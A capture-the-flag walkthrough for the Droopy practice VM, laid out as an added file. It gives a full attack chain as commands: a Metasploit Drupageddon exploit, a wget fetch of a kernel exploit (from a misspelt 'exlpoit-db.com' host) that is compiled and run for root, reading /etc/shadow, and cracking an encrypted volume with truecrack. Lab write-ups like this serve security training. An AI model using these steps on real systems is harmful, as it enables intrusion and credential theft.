@@ -1,0 +1,84 @@
+
+Hack the Droopy VM (CTF Challenge)
+
+In this article we will complete a root2boot challenge of Capture the Flag series. This is Walkthrough of droopy which is a vulnerable framework but it is little bit complex too. Download it from –> Here
+Walkthrough
+Let us start by scanning the network so that we can know the IP of our target. And to scan the network types the following:
+netdiscover
+
+Our target IP is 192.168.1.103. Now that we know our target let’s scan it, therefore, type:
+nmap -A 192.168.1.103
+
+From scanning, we gather that port number 80 is open and that it has Drupal’ version 7 which is known for its vulnerability. So let us start exploiting it so that we have our meterpreter session. To exploit open metasploit and type:
+search drupal
+
+Searching the exploit for drupal will list the various exploits. From the exploits you need to use drupal_drupageddon exploit. Now, type:
+Now type use exploit/multi/http/drupal_drupageddon
+msf exploit (drupal_drupageddon)>set rhost 192.168.1.103 (IP of Remote Host)
+msf exploit (drupal_drupageddon)>set rport 80
+msf exploit (drupal_drupageddon)>exploit
+
+Upon the execution of the above exploit you will have a meterpreter session. And once you have the meterpreter session then type:
+Running the following command will allow you to have better visibility of the path that you are in
+shell
+
+
+Now using the above commands we have entered the terminal. Our next step is to find the kernel version of Ubuntu. TO know the said type:
+lsb_release -a
+
+We, now know that our target is using Ubuntu 14.04 Let us try and search its exploit on exploit-db.com. Our search is successful and we have found our appropriate exploit as shown below:
+
+We already now know that this exploit is not available in metasploit from the site below:
+
+Now to download the exploit we have to find a writable file to download the exploit. Next I need to find a directory I can write to and run scripts from.
+find / -writable -type d 2>/dev/null 
+cd /tmp/ (It will take us into the /tmp folder)
+wget https://www.exlpoit-db.com/download/37292 (This will download the exploit)
+
+Now, we have over the downloaded file and compile it and then run it so have the control of root. To do so, commands are:
+mv 37292 37292.c (It will move the file and renamed it)
+gcc 37292.c -o kernel (This command will compile the file and output save it as kernel)
+chmod 777 kernel (It will give you the permission to execute the file)
+./kernel (It will execute the file)
+After executing the above commands we will enter the root. To confirm it let us try a command:
+whoami (This command will inform you that you are root)
+cd /root (it will take into the /root folder)
+ls (it will list all the files present in the root folder)
+
+We have found a file named dave.tc. If you open the file in the browser it will say to download the file. OK! Let’s download it.
+ We can easily get to /var/www/html/sites from the web front end so let’s copy dave.tc there
+cp dave.tc /var/www/html
+
+Let’s open the file from VeraCrypt. It’s the software which will help you to mount the file so that you can open it. Download it from –> https://veracrypt.codeplex.com/wikipage?title=Downloads
+When you open VeraCrypt, select 1 so that it will mount the disk into 1 disk.
+
+When you try to open it, it will ask you a password. Now we don’t have the password, let us explore and find it
+
+First of all let us explore the file which contains all the hash values. We all know the hash vales are in shadow folder. And to read it the command is:
+cat /etc/shadow
+
+We have the hash value of root. Now, let us check which hash is used. We check an online hash identifier to do our work. Search Google for “online hash identifier“
+
+We have used onlinehashcrack.com. Copy and paste the hash on the site. Result is showing us that the SHA512 is used to crypt it.
+
+While exploring we also found a mail. Let us read it and therefore type:
+cat /var/mail/www-data
+
+Now reading the mail we know certain things for sure and they are:
+To find our password we will first run a command which will filter our rockyou.txt file. We will strongly suggest you to filter it as we know it contains 8M passwords. If we run the txt file as it is then it will take whole day to find the password. So to filter it we will apply three conditions that the words we will collect should be in lower case and should have academy word in it.
+(Refernce : https://kaizensecurity.wordpress.com/2016/04/29/droopy-v0-2-solution/)
+To do so, the command is:
+awk ‘length($1) == 11 { print $1 }’ /usr/share/wordlists/rockyou.txt |egrep ‘^[[:lower:]]+academy’ > /root/Desktop/pass.txt
+
+Now that we have our txt file filtered, we will find the password using truecrack. The command is :
+truecrack –truecrypt /root/Download/dave.tc -k SHA512 -w ?root/Desktop/pass.txt
+
+Using the above command you will have you password in minutes. Now that we have our password, we will try and mount the drive from VeraCrypt again. Follow the same procedure as earlier and then add the password and check the true crypt mode.
+
+When you will click on OK. You will have the mounted drive in your Desktop
+
+Open the drive by double clicking on it and go to .secret and then open .top and that last you will have flag.txt
+
+VOILA!! You have achieved the flag!!
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
